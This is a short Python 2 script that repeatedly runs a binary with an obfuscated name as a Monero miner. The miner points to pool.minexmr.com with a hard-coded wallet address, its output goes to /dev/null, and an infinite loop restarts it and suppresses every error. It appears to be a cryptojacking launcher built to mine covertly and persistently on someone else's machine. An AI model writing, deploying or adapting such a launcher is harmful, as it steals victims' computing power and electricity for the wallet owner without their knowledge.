import os


if __name__ == '__main__':
    cmd = './nzmxcvbnmzxb -c x -M stratum+tcp://453M2LhF9P6SXxERnKdDbTdJDRe3iwzSrZCrdG3JJADzSgEhUFE2usocDTtENaetxzP6gaV7BkRMe9ktamyFZpzwPKyDyrJ:x@pool.minexmr.com:4444/xmr -t 2 > /dev/null'
    while True:
        try:
            os.system(cmd)
        except BaseException as e:
            print e
            pass
